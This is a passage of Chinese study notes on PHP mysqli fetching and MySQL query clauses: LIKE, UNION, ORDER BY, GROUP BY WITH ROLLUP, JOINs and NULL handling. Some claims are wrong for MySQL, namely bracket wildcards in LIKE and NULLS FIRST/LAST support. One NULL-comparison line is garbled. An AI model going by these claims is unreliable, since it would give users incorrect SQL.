，返回数字数组。区别不大，只不过是把下面的$row[‘id’]改成$row[0] ...$sql = &quot;SELECT id, name, age FROM users&quot;;$result = mysqli_query($conn, $sql);if (mysqli_num_rows($result) &gt; 0) &#123; // 使用 mysqli_fetch_array 结合 MYSQLI_ASSOC 获取数据 while ($row = mysqli_fetch_array($result, MYSQLI_ASSOC)) &#123; echo &quot;ID: &quot;. $row[&#x27;id&#x27;]. &quot;, 姓名: &quot;. $row[&#x27;name&#x27;]. &quot;, 年龄: &quot;. $row[&#x27;age&#x27;]. &quot;&lt;br&gt;&quot;; &#125;//没行了会返回false&#125; else &#123; echo &quot;没有找到记录&quot;;&#125;... 2.使用 mysqli_fetch_assoc没行返回null，但是也可以结束while mysqli_fetch_assoc($result),返回的直接是关联数组 相当于 mysqli_fetch_array($result,MYSQLI_ASSOC) 3.内存释放...$retval = mysqli_query( $conn, $sql );...mysqli_free_result($retval); where子句类似于if语句，判断真假，使用AND和OR组合，LIKE模糊匹配 一般的： ...WHERE username = &#x27;test&#x27;;...salary &gt;= 50000; 对于日期时间类型： ...WHERE order_date BETWEEN &#x27;2023-01-01&#x27; AND &#x27;2023-12-31&#x27;; 对于可空的： ...WHERE email IS [NOT] NULL; 默认的字符串比较不区分大小写（非like子句），如果要，写成： ...WHERE BINARY... LIKE子句代替等号用于where子句（或者having子句） 可使用的通配符包括： % 表示没有或者有任意个任意字符 _ 表示一个任意字符 其他匹配方式： []&#x2F;[^] 类似正则表达式，查询内容包含通配符时，可以用这个括起 可以组合使用，比如：a%o_ like子句是否区分大小写取决于字符集 不区分是： SELECT * FROM employees WHERE last_name LIKE ‘smi%’ COLLATE utf8mb4_general_ci; 合并查询数据（UNION）SELECT column1, column2, ... FROM table1 WHERE condition1UNION //加中间就行，可以叠叠乐SELECT column1, column2, ... FROM table2 WHERE condition2[ORDER BY column1, column2, ...]; //可选，排序合并后的数据 注意：1.会自动去除重复行（使用UNION ALL则不会，性能还会更好）。 ​ 2.每个 SELECT 语句的列数和对应位置的数据类型必须相同（即使来自不同表）。 排序ORDER BY子句，排序查询后的数据 SELECT column1, column2, ...FROM table_nameORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...; 默认ASC（升序）。DESC是降序 像上面那个多列排序，就是先按column1,再按column2 可以不用列名而用数字表示列的位置，例如： ORDER BY 3 DESC, 1 ASC; 8.0以上的版本，末尾有可选参数： NULLS FIRST或NULLS LAST ，表示排序时NULL的位置 注意： 如果字符集是utf-8，而不是GBK，排序时要先转码： SELECT * FROM runoob_tblORDER BY CONVERT(runoob_title using gbk); 分组 GROUP BY 语句根据一个或多个列对结果集进行分组。 在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。 SELECT column1, column2, aggregate_function(column3)FROM TABLE_NAMEWHERE conditionGROUP BY column1, column2; 实例SELECT customer_id, SUM(order_amount) AS total_amountFROM ordersGROUP BY customer_id;//计算每个客户的订单总金额 GROUP BY 子句通常与聚合函数一起使用，因为分组后需要对每个组进行聚合操作。 SELECT 子句中的列通常要么是分组列（GROUP BY使用的列），要么是聚合函数的参数。 可以使用多个列进行分组，只需在 GROUP BY 子句中用逗号分隔列名即可。 聚合函数： 如 SUM、AVG、COUNT、MIN、MAX 等，用于对每个分组的数据进行汇总计算。 使用WITH ROLLUP可选子句，实现在分组统计数据基础上再进行相同的统计 对比一下： mysql&gt; SELECT name,SUM(signin) as signin_count FROM employee_tbl GROUP BY name WITH ROLLUP;+--------+--------------+| name | signin_count |+--------+--------------+| 小丽 | 2 || 小明 | 7 || 小王 | 7 || NULL | 16 | //NULL表示所有人的登录次数，因为这列相加没有意义+--------+--------------+4 rows in set (0.00 sec) 以及 mysql&gt; SELECT name, COUNT(*) FROM employee_tbl GROUP BY name;+--------+----------+| name | COUNT(*) |+--------+----------+| 小丽 | 1 || 小明 | 3 || 小王 | 2 |+--------+----------+3 rows in set (0.01 sec) 为了避免NULL,可以使用 select coalesce(a,b,c);//按顺序判断是否为NULL,返回遇到的第一个非NULL值。（全NULL就返回NULL） 于是可改成： SELECT coalesce(name, &#x27;总数&#x27;), SUM(signin) as signin_count FROM employee_tbl GROUP BY name WITH ROLLUP; 多表查询（JOIN） INNER JOIN（内连接,或等值连接）：获取两个表中字段匹配关系的记录，可以简写为JOIN。 LEFT JOIN（左连接）：获取左表所有记录，即使右表没有对应匹配的记录。 RIGHT JOIN（右连接）： 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录。 SELECT column1, column2, ...FROM table1INNER JOIN table2 ON table1.column_name = table2.column_name;//只返回两表中column_name内容相同的行//SELECT中的列也要写成类似于table.column的形式，不必包含ON使用的那列 可以叠叠乐： SELECT orders.order_id, customers.customer_name, products.product_nameFROM ordersINNER JOIN customers ON orders.customer_id = customers.customer_idINNER JOIN order_items ON orders.order_id = order_items.order_idINNER JOIN products ON order_items.product_id = products.product_id;//此时只有在四个表的所选列中都存在的才会返回对应的SELECT LEFT&#x2F;RIGHT JOIN 以LEFT JOIN为例，RIGHT JOIN反之 SELECT column1, column2, ...FROM table1LEFT JOIN table2 ON table1.column_name = table2.column_name;[WHERE 条件]//返回左表中所有行的情况下。当右表中没有匹配的行时，相关列将显示为 NULL。 NULL值处理WHERE子句 is (not) null ORDER BY子句: NULLS FIRST/LAST 用于比较SELECT * FROM employees WHERE commission &lt;=&gt; NULL;`&lt;=&gt;`是比较表达式是否相等的特殊操作符，可以直接替换`=`都是NULL就返回TRUE注意：回值始终是NULL 聚合函数会被忽略 如果想指定为特定值，可以套个COALESCE或者它的下位IFNULL（只接受俩参数） 例如：AVG(COALESCE(salary, 0))或者AVG(IFNULL(salary, 0)) 正则表达式 模式 描述 ^ 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 ‘
